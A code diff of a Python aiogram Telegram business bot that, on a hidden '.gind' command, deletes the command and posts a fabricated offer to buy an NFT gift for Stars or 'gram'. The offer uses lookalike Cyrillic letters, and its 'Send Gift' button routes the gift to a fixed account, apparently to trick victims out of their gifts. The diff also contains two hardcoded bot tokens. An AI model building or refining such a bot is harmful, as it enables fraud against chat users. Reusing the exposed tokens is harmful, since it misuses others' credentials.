@@ -16,22 +16,20 @@ from aiogram.types import (
 )
 from aiogram.enums import ParseMode
 
-BOT_TOKEN = "8960768779:AAFtU7ecqGpSbBh70VieEh2zafzmO7Qnyvk"
+BOT_TOKEN = "8114218209:AAGrghBWWmwFF0crh2jcTzcA38KireDsZwE"
 
-# Айди премиум-эмодзи звезды (после суммы)
 EMOJI_STARS = "5920433463428650761"
-
-# Айди эмодзи на кнопках
+EMOJI_GRAM = "5267445215773367585"
 EMOJI_DECLINE_EN = "5774077015388852135"
 EMOJI_ACCEPT = "5774022692642492953"
 
-# Имя пользователя в первой строке оффера (не ссылка-профиль, а просто текст)
-OFFER_USERNAME = "give"
+OFFER_USERNAME = "Reggan"
+BUYER_USERNAME = "tonreggan"
 
-# Получатель подарка (открывается при нажатии "Send Gift")
-BUYER_USERNAME = "intelligentcup"
-
-logging.basicConfig(level=logging.INFO)
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
+)
 logger = logging.getLogger(__name__)
 
 bot = Bot(
@@ -47,7 +45,7 @@ offers: dict[str, dict] = {}
 @dp.business_connection()
 async def handle_business_connection(connection: BusinessConnection) -> None:
     business_owner_ids[connection.id] = connection.user.id
-    logger.info(f"BC: owner={connection.user.id}, id={connection.id}")
+    logger.info(f"[BC] owner={connection.user.id} connection_id={connection.id}")
 
 
 def parse_nft_link(link: str):
@@ -99,7 +97,7 @@ async def send_with_fallback(bc_id, chat_id, text, reply_markup):
             business_connection_id=bc_id,
         )
     except Exception as e:
-        logger.warning(f"send with emoji failed: {e}, retry without")
+        logger.warning(f"[send] with emoji failed: {e}, retry without")
         clean_text = re.sub(r"<tg-emoji[^>]*>(.*?)</tg-emoji>", r"\1", text)
         if reply_markup:
             for row in reply_markup.inline_keyboard:
@@ -122,10 +120,10 @@ async def edit_with_fallback(bc_id, chat_id, message_id, text, reply_markup=None
             text=text,
             reply_markup=reply_markup,
         )
-        logger.info("edit OK")
+        logger.info("[edit] OK")
         return True
     except Exception as e:
-        logger.warning(f"edit with emoji failed: {e}, retry without")
+        logger.warning(f"[edit] with emoji failed: {e}, retry without")
         clean_text = re.sub(r"<tg-emoji[^>]*>(.*?)</tg-emoji>", r"\1", text)
         if reply_markup:
             for row in reply_markup.inline_keyboard:
@@ -139,39 +137,49 @@ async def edit_with_fallback(bc_id, chat_id, message_id, text, reply_markup=None
                 text=clean_text,
                 reply_markup=reply_markup,
             )
+            logger.info("[edit] OK (fallback)")
             return True
         except Exception as e2:
-            logger.error(f"edit fallback failed: {e2}")
+            logger.error(f"[edit] fallback failed: {e2}")
             return False
 
 
 @dp.business_message(F.text.startswith(".gind"))
 async def handle_offer(message: Message) -> None:
     if not message.business_connection_id:
+        logger.warning("[offer] no business_connection_id")
         return
 
     bc_id = message.business_connection_id
     data = parse_offer_command(message.text)
     if not data:
+        logger.warning(f"[offer] parse failed for text: {message.text!r}")
         return
+
+    logger.info(
+        f"[offer] parsed: amount={data['amount']} "
+        f"currency={data['currency']} gift={data['gift_slug']}-{data['gift_number']}"
+    )
 
     try:
         await bot.delete_business_messages(
             business_connection_id=bc_id,
             message_ids=[message.message_id],
         )
-        logger.info("Команда .gind удалена")
+        logger.info("[offer] команда .gind удалена")
     except Exception as e:
-        logger.warning(f"delete failed: {e}")
+        logger.warning(f"[offer] delete failed: {e}")
 
     await asyncio.sleep(3)
 
     amount_fmt = f"{int(data['amount']):,}"
     gift_plain = f'{data["gift_slug"]}-{data["gift_number"]}'
-    gift_display = (
-        f'<a href="{data["link"]}"><b>{gift_plain}</b></a>'
-    )
-    emoji = f'<tg-emoji emoji-id="{EMOJI_STARS}">⭐</tg-emoji>'
+    gift_display = f'<a href="{data["link"]}"><b>{gift_plain}</b></a>'
+
+    if data["currency"] == "gram":
+        emoji = f'<tg-emoji emoji-id="{EMOJI_GRAM}">🪙</tg-emoji>'
+    else:
+        emoji = f'<tg-emoji emoji-id="{EMOJI_STARS}">⭐</tg-emoji>'
 
     text = (
         f"Usеr <b>{OFFER_USERNAME}</b> оffеrs уоu "
@@ -214,16 +222,28 @@ async def handle_offer(message: Message) -> None:
             reply_markup=keyboard,
         )
         offers[offer_id]["msg_id"] = sent.message_id
-        logger.info(f"Оффер {offer_id} отправлен в чат {message.chat.id}")
+        logger.info(
+            f"[offer] {offer_id} отправлен в чат {message.chat.id} "
+            f"(msg_id={sent.message_id})"
+        )
     except Exception as e:
-        logger.error(f"send failed: {e}")
+        logger.error(f"[offer] send failed: {e}")
 
 
 @dp.callback_query(F.data.startswith("dec:"))
 async def handle_decline(callback: CallbackQuery) -> None:
+    logger.info(f"[decline] callback: {callback.data}")
     _, offer_id = callback.data.split(":", 1)
     data = offers.get(offer_id)
-    if not data or data.get("accepted"):
+    if not data:
+        logger.warning(f"[decline] offer {offer_id} not found")
+        try:
+            await callback.answer("Заявка не найдена.", show_alert=True)
+        except Exception:
+            pass
+        return
+    if data.get("accepted"):
+        logger.info(f"[decline] offer {offer_id} уже принят")
         try:
             await callback.answer()
         except Exception:
@@ -241,6 +261,7 @@ async def handle_decline(callback: CallbackQuery) -> None:
         message_id=data["msg_id"],
         text=decline_text,
     )
+    logger.info(f"[decline] offer {offer_id} обновлён")
 
     try:
         await callback.answer()
@@ -250,9 +271,18 @@ async def handle_decline(callback: CallbackQuery) -> None:
 
 @dp.callback_query(F.data.startswith("acc:"))
 async def handle_accept(callback: CallbackQuery) -> None:
+    logger.info(f"[accept] callback: {callback.data}")
     _, offer_id = callback.data.split(":", 1)
     data = offers.get(offer_id)
-    if not data or data.get("accepted"):
+    if not data:
+        logger.warning(f"[accept] offer {offer_id} not found")
+        try:
+            await callback.answer("Заявка не найдена.", show_alert=True)
+        except Exception:
+            pass
+        return
+    if data.get("accepted"):
+        logger.info(f"[accept] offer {offer_id} уже принят")
         try:
             await callback.answer()
         except Exception:
@@ -260,6 +290,10 @@ async def handle_accept(callback: CallbackQuery) -> None:
         return
 
     data["accepted"] = True
+    logger.info(
+        f"[accept] offer {offer_id} currency={data['currency']} "
+        f"amount={data['amount']}"
+    )
 
     amount_fmt = f"{int(data['amount']):,}"
     gift_plain = f'{data["gift_slug"]}-{data["gift_number"]}'
@@ -267,7 +301,11 @@ async def handle_accept(callback: CallbackQuery) -> None:
         f'<a href="{data["link"]}"><b>{gift_plain}</b></a> '
         f'({data["link"]})'
     )
-    emoji = f'<tg-emoji emoji-id="{EMOJI_STARS}">⭐</tg-emoji>'
+
+    if data["currency"] == "gram":
+        emoji = f'<tg-emoji emoji-id="{EMOJI_GRAM}">🪙</tg-emoji>'
+    else:
+        emoji = f'<tg-emoji emoji-id="{EMOJI_STARS}">⭐</tg-emoji>'
 
     rand_suffix = "".join(
         random.choices(string.ascii_uppercase + string.digits, k=8)
@@ -302,13 +340,17 @@ async def handle_accept(callback: CallbackQuery) -> None:
         ]
     )
 
-    await edit_with_fallback(
+    ok = await edit_with_fallback(
         bc_id=data["bc_id"],
         chat_id=data["chat_id"],
         message_id=data["msg_id"],
         text=accept_text,
         reply_markup=keyboard,
     )
+    if ok:
+        logger.info(f"[accept] offer {offer_id} обновлён (edit)")
+    else:
+        logger.error(f"[accept] offer {offer_id} edit не удался")
 
     try:
         await callback.answer()
